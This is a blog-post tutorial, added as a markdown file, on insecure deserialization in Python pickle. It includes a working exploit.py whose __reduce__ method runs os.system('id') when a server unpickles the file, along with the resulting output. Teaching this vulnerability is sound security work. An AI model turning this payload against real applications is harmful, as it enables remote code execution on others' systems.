@@ -1,0 +1,326 @@
+---
+title: Unveiling the Dangers of Insecure Deserialization!
+description: Insecure deserialization in web apps is a critical vuln that allows attackers to exploit serialized objects for code execution.
+date: 2025-03-25
+tags: ['Insecure Deserialization', 'Web Security']
+image: 'assets/banner.png'
+authors: ['thehackersbrain']
+---
+
+# Introduction
+
+In this post, we are going to explore one of the lesser-known yet highly dangerous vulnerability called **Insecure Deserialization**. This vulnerability can expose your applications to significant risks, making it a crucial issue for developers and cybersecurity professionals to address. Before diving deep into _What is Insecure Deserialization?_ First let's disscuss what is **serialization** and **deserialization**.
+
+## Serialization
+
+**Serialization** is the process of converting an object or data structure into a format that can be easily stored or transmitted. This process is crucial in scenarios where data needs to be saved persistently or shared across different parts of an application, between different applications, or over a network.
+Serialization typically involves transforming the object into a sequence of bytes or a structured format like _JSON_, _XML_, or _binary_. The serialized data can be stored in a file, sent over a network, or saved in a database file. When serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
+
+Here are some example scenarios where **Serialization** of data can come in handy.
+
+- **Saving Game State**: In gaming, serialization is commonly used to save the state of a game. For example, as we know games or any program, first loads itself in RAM (Random Access Memory) and all of its contents get flushed when the system reboots. So in order to save the current progress of the game we use serialization. like a player's progress -- such as their level, inventory, and achievements -- can be serialized into a file. When the player returns to the game, the saved state can be deserialized to restore their progress exactly where they left off.
+- **Session Management in Web Applications**: Web applications often use serialization to manage user sessions. For instance, when a user logs into a web application, their session information (like user ID, preferences, and authentication tokens) might be serialized and stored in a cookie or on the server. When the user returns to the application, the session data is deserialized to restore their session state, providing a seamless user experience.
+
+Let's take a closer look at the _serialization_ process in action.
+
+```py title="client.py" caption="A class and object"
+# A class to create some data objects
+class Shinobi:
+    def __init__(self, name, rank, missions):
+        self.name = name
+        self.rank = rank
+        self.missions = missions
+
+    def summary(self):
+        return "{} is a {} with {} completed missions.".format(
+            self.name, self.rank, self.missions
+        )
+
+
+# creating an object
+shinobi1 = Shinobi("Naruto Uzumaki", "genin", 45)
+
+print(shinobi1)
+print(shinobi1.summary())
+
+# [Output] --------------------------------
+# | <__main__.Shinobi object at 0x7fa1e6030770>
+# | Naruto Uzumaki is a genin with 45 completed missions.
+# | [Finished in 14ms]
+```
+
+now we have an object called `shinobi1` from class `Shinobi`, now let's serialize this object. In python we use a module called `pickle` to _serialize_ and _deserialize_ objects.
+we can _serialize_ the object using `dumps()` function from `pickle` module.
+
+```py {2,18,24-25} title="client.py" caption="Serializing the object" showLineNumbers
+# to serialize and deserialize the data
+import pickle
+
+# A class to create some data objects
+class Shinobi:
+    def __init__(self, name, rank, missions):
+        self.name = name
+        self.rank = rank
+        self.missions = missions
+
+    def summary(self):
+        return "{} is a {} with {} completed missions.".format(
+            self.name, self.rank, self.missions
+        )
+
+
+# creating an object
+shinobi1 = Shinobi("Naruto Uzumaki", "genin", 45)
+
+print(shinobi1)
+print(shinobi1.summary())
+
+# serializing the data
+serialized = pickle.dumps(shinobi1)
+print("\nHere's the serialize object: \n{}".format(serialized))
+
+# [Output] --------------------------------------------------
+# | <__main__.Shinobi object at 0x7ff82b334950>
+# | Naruto Uzumaki is a genin with 45 completed missions.
+
+# | Here's the serialize object:
+# | b'\x80\x04\x95T\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07Shinobi\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x0eNaruto Uzumaki\x94\x8c\x04rank\x94\x8c\x05genin\x94\x8c\x08missions\x94K-ub.'
+# | [Finished in 20ms]
+```
+
+we can save the serialized object in a file and use it later.
+
+```py {2-3} title="client.py"
+# saving the serialized data in a local file
+with open('user_data.pkl', 'wb') as fh:
+    fh.write(serialized)
+
+# [Output] --------------------------------------------------
+# | $ cat user_data.pkl
+# | __main__Shinobi)}(nameNaruto UzumakirankgenimissionsK-ub.%
+# |
+# | $ file user_data.pkl
+# | user_data.pkl: data
+```
+
+we can get a quick disassembly of _serialized_ data using a built-in module in python called `pickletools`.
+
+```py {2,4} title="client.py"
+ # to get disassembly of serialzed data
+import pickletools
+# .....
+print(pickletools.dis(serialized))
+
+# [Output] -------------------------------------------------
+# | <__main__.Shinobi object at 0x7bde13d34cb0>
+# | Naruto Uzumaki is a genin with 45 completed missions.
+
+# | Here's the serialize object:
+# | b'\x80\x04\x95T\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07Shinobi\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x0eNaruto Uzumaki\x94\x8c\x04rank\x94\x8c\x05genin\x94\x8c\x08missions\x94K-ub.'
+# |     0: \x80 PROTO      4
+# |     2: \x95 FRAME      84
+# |    11: \x8c SHORT_BINUNICODE '__main__'
+# |    21: \x94 MEMOIZE    (as 0)
+# |    22: \x8c SHORT_BINUNICODE 'Shinobi'
+# |    31: \x94 MEMOIZE    (as 1)
+# |    32: \x93 STACK_GLOBAL
+# |    33: \x94 MEMOIZE    (as 2)
+# |    34: )    EMPTY_TUPLE
+# |    35: \x81 NEWOBJ
+# |    36: \x94 MEMOIZE    (as 3)
+# |    37: }    EMPTY_DICT
+# |    38: \x94 MEMOIZE    (as 4)
+# |    39: (    MARK
+# |    40: \x8c     SHORT_BINUNICODE 'name'
+# |    46: \x94     MEMOIZE    (as 5)
+# |    47: \x8c     SHORT_BINUNICODE 'Naruto Uzumaki'
+# |    63: \x94     MEMOIZE    (as 6)
+# |    64: \x8c     SHORT_BINUNICODE 'rank'
+# |    70: \x94     MEMOIZE    (as 7)
+# |    71: \x8c     SHORT_BINUNICODE 'genin'
+# |    78: \x94     MEMOIZE    (as 8)
+# |    79: \x8c     SHORT_BINUNICODE 'missions'
+# |    89: \x94     MEMOIZE    (as 9)
+# |    90: K        BININT1    45
+# |    92: u        SETITEMS   (MARK at 39)
+# |    93: b    BUILD
+# |    94: .    STOP
+# | highest protocol among opcodes = 4
+# | None
+# | [Finished in 24ms]
+```
+
+The complete script
+
+```py title="client.py" caption="Complete Code" showLineNumbers
+import pickle # to serialize and deserialize the data
+import pickletools # to get disassembly of serialzed data
+
+# A class to create some data objects
+class Shinobi:
+    def __init__(self, name, rank, missions):
+        self.name = name
+        self.rank = rank
+        self.missions = missions
+
+    def summary(self):
+        return "{} is a {} with {} completed missions.".format(
+            self.name, self.rank, self.missions
+        )
+
+
+# creating an object
+shinobi1 = Shinobi("Naruto Uzumaki", "genin", 45)
+
+print(shinobi1)
+print(shinobi1.summary())
+
+serialized = pickle.dumps(shinobi1)
+print("\nHere's the serialize object: \n{}".format(serialized))
+
+# saving the serialized data in a local file
+with open('user_data.pkl', 'wb') as fh:
+    fh.write(serialized)
+
+
+print(pickletools.dis(serialized))
+```
+
+---
+
+## Deserialization
+
+**Deserialization** is the reverse of serialization—it converts the _serialized_ data back into an object or data structure that the application can use. _Deserialization_ is essential when an application needs to retrieve and use data that was previously serialized, such as loading a saved game state or restoring a user’s session in a web application.
+
+Let's create a `server.py` file to _deserialize_ and use the saved object file.
+
+```py {16-17,20,22} title="server.py" caption="Deserialization of the object"
+import pickle # to deserialize the object
+
+# the shinobi class
+class Shinobi:
+    def __init__(self, name, rank, missions):
+        self.name = name
+        self.rank = rank
+        self.missions = missions
+
+    def summary(self):
+        return "{} is a {} with {} completed missions.".format(
+            self.name, self.rank, self.missions
+        )
+
+# reading the serialized object file
+with open('user_data.pkl', 'rb') as fh:
+	data = fh.read()
+
+# deserializing the object
+deserialized = pickle.loads(data)
+
+print(deserialized.summary())
+
+# [Output] ------------------------------------------
+# | Naruto Uzumaki is a genin with 45 completed missions.
+# | [Finished in 21ms]
+```
+
+we use `loads()` function from `pickle` module to _deserialize_ a _serialized_ object. As from the output of the above program, we see that we can call the summary function from `Shinobi` class with all of the data we provided from the `client.py` file while serializing the data. this is because the state of an object is persisted while serializing or deserializing the data.
+
+Now let's get back to our original topic: **Insecure Deserialization**.
+
+## The Vulnerability
+
+While _serialization_ and _deserialization_ are powerful tools, they come with significant risks when not implemented securely. **Insecure Deserialization** occurs when an application _deserializes_ data from an untrusted source without proper validation or security checks. This can allow attackers to manipulate the _serialized_ data and inject malicious code or instructions, leading to severe security issues or vulnerabilities, as most of the data that is being _serialized_ is **user-controllable**.
+<br/>Ideally, user input or user-controllable data should never be _deserialized_ at all. However, sometimes the developer assumes they are safe from these attacks as they have implemented some form of additional checks on _deserialized_ data. These checks are also fundamentally flawed as they rely on checking the data after it has been _deserialized_, which in many cases is too late to prevent the attack. we will see a practical example of this, later in this article.
+
+## The Exploit
+
+Let's revisit our previous `client.py` and `server.py` programs. Assume that the `server.py` file is the _server_ which looks for stored serialized file from the client side, and then deserializes and uses it on the server side. To exploit **insecure deserialization** vulnerabilities, the attack injects malicious code or instructions in the _serialized_ data which later performs its execution on the server side after or while the data is _deserialized_. Let's prepare our payload for a _command execution_ on the server.
+
+For this purpose, we are going to use the `__reduce__()` function. When we try to _pickle_ or _serialize an object using pickle_, there might be some properties that don't serialize well. for example _an open file handle_. _Pickle_ won't know how to handle the object and will throw an error. here `__reduce__()` function comes to the rescue, we can specify how to handle these types of objects natively within the class directly. The `__reduce__()` function will be invoked when the data is loaded before _deserialization_.
+
+The `__reduce__()` method takes no argument and should return either a `string` or a `tuple`. when a `string` is returned, it should be stored in a global variable and when a `tuple` is returned, it must be between two and six items long. The 1st item should be a callable function or object and the 2nd item should also be a `tuple` which should be the arguments of the _function_ or _objects_ in the 1st item.
+
+Now let's create a `exploit.py` file to use the `__reduce__()` method to get _command execution_ on the server (`server.py`).
+
+```py {2,7-8} title="exploit.py" caption="Exploiting the deserialization process" showLineNumbers
+import pickle # to serialize the data
+import os
+
+# the class for our payload object
+class Shinobi:
+	# this function will be invoked as soon as the object data is finished loading.
+	def __reduce__(self):
+		return (os.system, ('id',))
+
+	def __init__(self, name, rank, missions):
+		self.name = name
+		self.rank = rank
+		self.missions = missions
+
+	def summary(self):
+ 		return "{} is a {} with {} completed missions.".format(
+            self.name, self.rank, self.missions
+        )
+
+# create the object
+shinobi1 = Shinobi('Naruto Uzumaki', 'genin', 48)
+
+# serialize the data with __reduce__() method implemented.
+serialized = pickle.dumps(shinobi1)
+
+# create the object file
+with open('user_data.pkl', 'wb') as fh:
+	fh.write(serialized)
+	print('The payload is created: \'user_data.pkl\'!')
+
+# [Output] -----------------------------------------------
+# | The payload is created: 'user_data.pkl'!
+# | [Finished in 21ms]
+```
+
+Now let's try and run our `server.py` and see if the payload worked.
+
+```py {20,22,25} title="server.py"
+import pickle # to deserialize the object
+
+# the shinobi class
+class Shinobi:
+    def __init__(self, name, rank, missions):
+        self.name = name
+        self.rank = rank
+        self.missions = missions
+
+    def summary(self):
+        return "{} is a {} with {} completed missions.".format(
+            self.name, self.rank, self.missions
+        )
+
+# reading the serialized object file
+with open('user_data.pkl', 'rb') as fh:
+	data = fh.read()
+
+# deserializing the object
+deserialized = pickle.loads(data) # highlight-line
+
+print(deserialized.summary()) # highlight-line
+
+# [Output] -------------------------------------------------------
+# | uid=1000(elliot) gid=1000(elliot) groups=1000(elliot),108(vboxusers),962(docker),994(input),998(wheel)            <----       command execution
+# | Traceback (most recent call last):
+# |   File "/home/elliot/youtube/insecure-deserialization/server.py", line 22, in <module>
+# |     print(deserialized.summary())
+# |           ^^^^^^^^^^^^^^^^^^^^
+# | AttributeError: 'int' object has no attribute 'summary'
+# | [Finished in 28ms with exit code 1]
+# | [cmd: ['python3', '-u', '/home/elliot/youtube/insecure-deserialization/server.py']]
+# | [dir: /home/elliot/youtube/insecure-deserialization]
+# | [path: /home/elliot/tools/google-cloud-sdk/bin:/home/elliot/.local/bin:/home/elliot/.local/share/lvim/mason/bin:/home/elliot/.nvm/versions/node/v20.15.1/bin:/home/elliot/tools/google-cloud-sdk/bin:/home/elliot/.local/bin:/opt/jython/bin/:/sbin:/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/opt/android-sdk/cmdline-tools/latest/bin:/opt/android-sdk/platform-tools:/opt/android-sdk/tools:/opt/android-sdk/tools/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/home/elliot/.local/bin/:/home/elliot/.cargo/bin:/home/elliot/.npm-global/bin:/home/elliot/devs/flutter/bin:/home/elliot/android-sdk/platform-tools:/home/elliot/go/bin/:/home/elliot/.local/share/gem/ruby/3.0.0/bin:/home/elliot/.config/emacs/bin:/home/elliot/.local/bin/:/home/elliot/.cargo/bin:/home/elliot/.npm-global/bin:/home/elliot/devs/flutter/bin:/home/elliot/android-sdk/platform-tools:/home/elliot/go/bin/:/home/elliot/.local/share/gem/ruby/3.0.0/bin:/home/elliot/.config/emacs/bin]
+```
+
+and There we have it. our payload worked.
+
+## Conclusion
+
+Serialization and deserialization are indispensable tools in modern software development, enabling efficient data storage and transmission across a wide range of applications. However, the power of these processes comes with significant risks, especially when it comes to insecure deserialization. By understanding the dangers and implementing robust security measures, developers and security professionals can protect their applications from the potentially devastating consequences of this hidden vulnerability.
+
+This was an introduction and a quick demonstration of **Insecure Deserialization** vulnerability. In upcoming posts, we are going to discuss in great detail and see how we can exploit them in the wild!
